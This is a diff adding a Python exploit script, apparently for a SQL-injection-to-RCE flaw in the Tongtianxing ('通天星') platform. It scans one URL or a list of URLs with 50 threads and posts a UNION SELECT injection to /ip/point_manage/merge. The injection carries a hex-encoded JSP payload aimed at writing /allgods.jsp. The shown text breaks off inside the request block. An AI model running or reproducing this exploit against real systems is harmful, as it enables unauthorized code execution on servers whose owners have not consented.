@@ -1,0 +1,67 @@
+#导包
+import requests
+import re
+import sys
+import argparse
+from multiprocessing.dummy import Pool
+import urllib3
+urllib3.disable_warnings()
+
+def banner():
+    ico = """
+.------..------..------..------..------.
+|L.--. ||A.--. ||O.--. ||L.--. ||I.--. |
+| :/\: || (\/) || :/\: || :/\: || (\/) |
+| (__) || :\/: || :\/: || (__) || :\/: |
+| '--'L|| '--'A|| '--'O|| '--'L|| '--'I|
+`------'`------'`------'`------'`------'
+
+    """
+    print(ico)
+
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description='通天星SQL注入导致文件上传rce')
+    parser.add_argument('-u', '--url', dest='url', type=str, help='单个URL')
+    parser.add_argument('-f', '--file', dest='file', type=str, help='批量URL文件')
+    args = parser.parse_args()
+
+    if args.url:
+        poc(args.url)
+    elif args.file:
+        url_list = []
+        with open(args.file, 'r', encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip())
+        mp = Pool(50)
+        mp.map(poc, url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
+#寻找响应包中独有的字段最为判断条件：eth
+def poc(target):
+    # 目标 URL
+    url = '/ip/point_manage/merge'  # 替换为你的实际 URL
+
+    # 请求头部（可选）
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2882.93 Safari/537.36',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+
+    # POST 请求的数据
+    data = {
+        'id': "1",
+        'name': "1' UNION SELECT NULL, 0x3c25206f75742e7072696e7428227a7a3031306622293b206e6577206a6176612e696f2e46696c65286170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574536572766c657450617468282929292e64656c65746528293b20253e,NULL,NULL,NULL,NULL,NULL,NULL",
+        'type': "3",
+        'map_id': "4",
+        'install_place': "5",
+        'check_item': "6",
+        'create_time': "7",
+        'update_time': "8"
+    }
+    api="/allgods.jsp"
+    try:
+        res=requests.post(url=target+url,headers=headers,data=data,verify=False,timeout=6)
+    
